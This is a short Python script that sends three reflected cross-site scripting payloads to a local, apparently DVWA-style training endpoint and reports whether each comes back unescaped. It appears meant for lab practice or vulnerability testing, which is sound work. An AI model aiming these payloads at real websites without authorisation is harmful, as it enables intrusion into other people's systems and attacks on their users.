import requests

def xss():
    url = "http://localhost:4280/vulnerabilities/xss_r/"
    payloads = [
        "<script>alert('xss')</script>",
        "\"><script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>"
    ]

    for payload in payloads:
        params = {"name": payload}
        session = requests.Session()
        response = session.get(url, params=params)
        if response.status_code != 200:
            print(f"Error: {response.status_code}")
            continue
        if payload in response.text:
            print(f"Payload: {payload} - Vulnerable to XSS")
        else:
            print(f"Payload: {payload} - Not vulnerable to XSS")

if __name__ == "__main__":
    xss()